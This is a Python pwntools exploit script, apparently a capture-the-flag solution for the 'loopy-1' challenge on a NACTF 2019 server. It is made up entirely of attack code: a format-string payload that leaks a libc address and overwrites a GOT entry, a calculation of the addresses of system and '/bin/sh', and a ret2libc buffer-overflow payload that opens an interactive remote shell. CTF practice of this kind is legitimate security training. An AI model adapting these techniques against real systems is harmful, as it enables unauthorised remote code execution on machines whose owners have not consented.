#!/usr/bin/env python

import re
from pwn import *


libc = ELF('./libc.so.6')
#r = process("./loopy-1", env={"LD_PRELOAD": "./ld-2.28.so ./libc.so.6"})
r = remote("shell.2019.nactf.com", 31732)
#pause()

print(r.recvuntil("Type something>"))
payload = (
    ".%3$x..." +
    p32(0x0804c014) +
    "%37270x.%9$hn" +
    "C" * 60
)
r.sendline(payload)
data =r.recvuntil("Type something>")
print(data)

leak = int(re.search("\.([0-9a-f]+)\.", data).group(1), 16)

base = leak - 0x1dad80
system = base + libc.symbols["system"]
binsh = base +libc.search("/bin/sh").next()

print("Leak", hex(leak))
print("Base", hex(base))
print("System", hex(system))
print("bin/sh", hex(binsh))

payload = (
    "A" * 80 +
    p32(system) +
    "B" * 4 +
    p32(binsh)
)
r.sendline(payload)
print(r.recvuntil("Type something>"))

r.sendline("A")
r.interactive()

r.close()
